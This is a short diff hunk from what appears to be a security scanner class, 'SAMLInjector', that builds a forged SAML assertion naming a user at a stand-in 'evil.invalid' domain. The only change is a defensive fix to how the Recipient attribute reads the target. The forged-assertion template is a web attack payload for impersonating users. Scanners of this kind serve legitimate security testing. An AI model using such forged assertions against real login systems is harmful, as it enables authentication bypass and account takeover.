@@ -1095,7 +1095,7 @@ class SAMLInjector(BaseScanner):
             f'<saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
             f'{username}@evil.invalid</saml:NameID>'
             f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
-            f'<saml:SubjectConfirmationData NotOnOrAfter="{future}" Recipient="{self.target}"/>'
+            f'<saml:SubjectConfirmationData NotOnOrAfter="{future}" Recipient="{getattr(self, "target", "")}"/>'
             f'</saml:SubjectConfirmation></saml:Subject>'
             f'<saml:Conditions NotBefore="{now}" NotOnOrAfter="{future}"/>'
             f'<saml:AuthnStatement AuthnInstant="{now}">'
